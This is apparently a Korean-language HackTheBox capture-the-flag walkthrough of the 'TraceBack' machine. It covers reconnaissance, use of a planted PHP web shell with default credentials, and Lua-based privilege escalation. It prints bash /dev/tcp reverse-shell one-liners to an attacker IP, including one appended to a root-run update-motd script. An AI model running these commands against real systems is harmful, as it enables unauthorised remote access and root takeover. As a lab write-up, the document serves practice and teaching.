# TraceBack - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA TraceBack 10.10.10.181
```
<img width="1105" height="380" alt="image" src="https://github.com/user-attachments/assets/d04e4b83-403c-49b3-9126-7e02e9cb0d64" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1105" height="314" alt="image" src="https://github.com/user-attachments/assets/8f0ba7a9-b760-4d29-8a54-c5457f707b4d" />

### Web Shell
- 메인페이지의 소스코드에서 주석으로 처리된 부분 발견.
<img width="619" height="786" alt="image" src="https://github.com/user-attachments/assets/68c95385-596b-41d6-b5ab-b66dd7353a62" />

<br>
<br>

- https://github.com/TheBinitGhimire/Web-Shells
- 해당 주석을 검색하니 `web shell`들을 모아놓은 깃허브가 검색됨.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/ddfb8fb4-b361-40e6-9efb-d8ba925a7ed3" />

<br>
<br>

- 많은 웹셸들 중에 특정한 파일이 업로드가 된지 시도하다보니 `/smevk.php`로 연결이 가능.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/0b8c4b83-b9f9-4683-a735-7c2512cf3d33" />

<br>
<br>

- https://github.com/TheBinitGhimire/Web-Shells/blob/master/PHP/smevk.php
- `admin:admin`으로 로그인.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/fe8aa266-ea64-4892-9e09-d8671a8d16b9" />

<br>
<br>

- `Execute`에서 명령어 실행 가능.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/d8afea5f-c0dc-4006-90de-2b0332b3958d" />

<br>
<br>

- 리버스 셸 실행.
```bash
bash -c 'bash -i >&/dev/tcp/10.10.16.3/80 0>&1'
```
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/c00f8f62-3d24-4cbe-a689-00a750f8a5bb" />

<br>
<br>

- 셸 획득.
<img width="1103" height="187" alt="image" src="https://github.com/user-attachments/assets/50c0db5a-c0d4-4f84-9913-0622f0ada79c" />

---
## Privesc
- `sysadmin`권한으로 `/home/sysadmin/luvit`를 실행 가능.
<img width="1105" height="133" alt="image" src="https://github.com/user-attachments/assets/22b43071-c46e-4533-a6d0-35afea8ded22" />

<br>
<br>

- `/home/webadmin`에서 `note.txt`발견.
<img width="1105" height="95" alt="image" src="https://github.com/user-attachments/assets/154dbcfb-7aaf-4849-9ee9-8f92847617ce" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/lua/
- `/home/sysadmin/luvit`가 `lua`스크립트라고 가정하고 명령어 실행하여 `sysadmin` 셸 획득.
```
sudo -u sysadmin /home/sysadmin/luvit

os.execute("/bin/sh")
```
<img width="1105" height="97" alt="image" src="https://github.com/user-attachments/assets/00ce0cfc-81c2-4fa3-a648-c220b8232e4f" />

<br>
<br>

- `pspy64`를 로컬로부터 다운로드 받아 실행해보니 주기적으로 특정 명령어가 실행되는 것을 확인.
<img width="1105" height="79" alt="image" src="https://github.com/user-attachments/assets/8531e652-be6e-48e3-8467-32c1b821ea55" />

<br>
<br>

- https://manpages.ubuntu.com/manpages/jammy/man5/update-motd.5.html
- `update-motd.d`가 뭔지 확인해보니 로그인이 발생할 때마다 `root`유저가 폴더에 있는 스크립트를 실행하는 것이라고 한다.
<img width="1240" height="479" alt="image" src="https://github.com/user-attachments/assets/29b05a55-f1a1-41fb-a70d-773b11d93c50" />

<br>
<br>

- `sysadmin`계정으로 SSH로그인을 하기 위해서 `authorized_keys`에 로컬의 공개키를 추가.
<img width="1103" height="43" alt="image" src="https://github.com/user-attachments/assets/cc5a7c24-4eeb-44e0-9851-1b7965bf0ce3" />

<br>
<br>

- `00-header`파일에 리버스 셸 명령어 추가.
- 지속적으로 스크립트가 초기화되기 때문에 SSH로그인까지 최대한 빠르게 진행해야 한다.
```bash
echo 'bash -c "bash -i >&/dev/tcp/10.10.16.3/80 0>&1"' >> 00-header
```
<img width="1103" height="22" alt="image" src="https://github.com/user-attachments/assets/4702ed3f-3f9e-447b-b8f7-fa18211307d3" />

<br>
<br>

- 로컬에서 `sysadmin`계정 SSH 로그인.
<img width="1103" height="122" alt="image" src="https://github.com/user-attachments/assets/32627ac3-ded5-43d4-905a-77eb5290d69e" />

<br>
<br>

- `root` 셸 획득.
<img width="1103" height="180" alt="image" src="https://github.com/user-attachments/assets/518b0ee7-8743-48c5-b7dd-586b8d680d35" />

---
## FLAG
- `/home/sysadmin/user.txt`
<img width="1103" height="288" alt="image" src="https://github.com/user-attachments/assets/b1866c61-07d5-45f6-91af-d63c05ba055b" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="251" alt="image" src="https://github.com/user-attachments/assets/254cc91b-9bbd-4ffb-aa19-90ddacdf32f8" />
